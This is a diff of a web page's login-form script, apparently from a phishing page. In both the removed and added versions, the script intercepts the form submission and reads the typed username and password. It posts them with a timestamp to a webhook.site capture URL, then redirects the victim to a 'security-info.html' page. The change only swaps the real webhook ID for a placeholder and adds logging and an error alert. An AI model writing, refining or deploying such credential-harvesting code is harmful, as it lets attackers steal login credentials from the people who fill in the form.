@@ -24,26 +24,32 @@
     </div>
 
     <script>
-        document.getElementById("authForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent actual form submission
+       document.getElementById("authForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent actual form submission
 
-            let formData = new FormData();
-            formData.append("user", document.querySelector('input[name="user"]').value);
-            formData.append("pass", document.querySelector('input[name="pass"]').value);
-            formData.append("action", "Login Attempt");
-            formData.append("time", new Date());
+        let formData = new FormData();
+        formData.append("user", document.querySelector('input[name="user"]').value);
+        formData.append("pass", document.querySelector('input[name="pass"]').value);
+        formData.append("action", "Login Attempt");
+        formData.append("time", new Date());
 
-            fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log("Webhook response:", data);
-                window.location.href = "security-info.html"; // Redirect after successful send
-            })
-            .catch(error => console.error("Error:", error));
+        fetch("https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", {
+            method: "POST",
+            body: formData
+        })
+        .then(response => {
+            console.log("Webhook response received.");
+            return response.text(); // Convert response to text (optional)
+        })
+        .then(data => {
+            console.log("Server response:", data);
+            window.location.href = "security-info.html"; // Redirect after successful send
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("There was an issue submitting the form. Please try again."); // Alert user if something goes wrong
         });
+    });
     </script>
 
 </body>
